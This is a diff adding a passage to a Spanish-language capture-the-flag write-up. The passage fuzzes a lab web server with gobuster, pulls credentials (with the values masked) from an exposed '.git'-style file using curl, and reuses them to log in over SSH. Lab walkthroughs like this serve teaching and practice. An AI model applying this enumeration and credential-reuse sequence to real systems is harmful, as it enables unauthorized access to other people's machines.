@@ -228,7 +228,46 @@ Tras analizar toda la info hemos decidido empezar por el puerto 31337/tcp open  
 
 -Fuzzeamos la web en busqueda de directorios que contengan informacion util
 
+    ┌──(root㉿kali)-[/home/…/Desktop/ctf/frankherby_app/nmap]
+    └─# gobuster dir -u http://10.10.209.46:31337/ -w /usr/share/seclists/Discovery/Web-Content/dirsearch.txt -o ../fuzz 2>/dev/null
+    ===============================================================
+    Gobuster v3.5
+    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+    ===============================================================
+    /%2e%2e//google.com   (Status: 400) [Size: 157]
+    /.                    (Status: 200) [Size: 4795]
+    /.git------------     (Status: 200) [Size: 50]
+    //                    (Status: 200) [Size: 4795]
+    /assets/              (Status: 403) [Size: 153]
+    /css/                 (Status: 403) [Size: 153]
+    /css                  (Status: 301) [Size: 169] [--> http://10.10.209.46/css/]
+    /index.html           (Status: 200) [Size: 4795]
+    /vendor/              (Status: 403) [Size: 153]
+
+Revisamos todos los directorios encontrados en busqueda de informacion valida, en el directorio /.git------ encontramos una credenciales interesantes.
+Para obtener las credenciales lo podemos hacer a traves del navegador tambien, nos descargamos el ficherito y listo.
+
+Esctructura de las credenciales encontradas--> [protocolo web][usuario]:[password(urlencondeada)]@[ip equipo conexion]
+
+    ┌──(root㉿kali)-[/home/…/Desktop/ctf/frankherby_app/nmap]
+    └─# curl http://10.10.209.46:31337/.git-------     
+
+            frank:passwd
+
+Si recordamos en la fase de enumeracion de puertos vemos que el puerto 22 corre un servicio ssh, vamos a probar las credenciales.
+
+    ┌──(root㉿kali)-[/home/…/Desktop/ctf/frankherby_app/nmap]
+    └─# ssh frank@10.10.209.46
+    The authenticity of host '10.10.209.46 (10.10.209.46)' can't be established.
+
+    frank@10.10.209.46's password: --------> passwd(decode)
     
+    Last login: Fri Oct 29 10:47:08 2021 from 192.168.120.38
+    frank@dev-01:~$ 
+
+
+
+
 
   
   
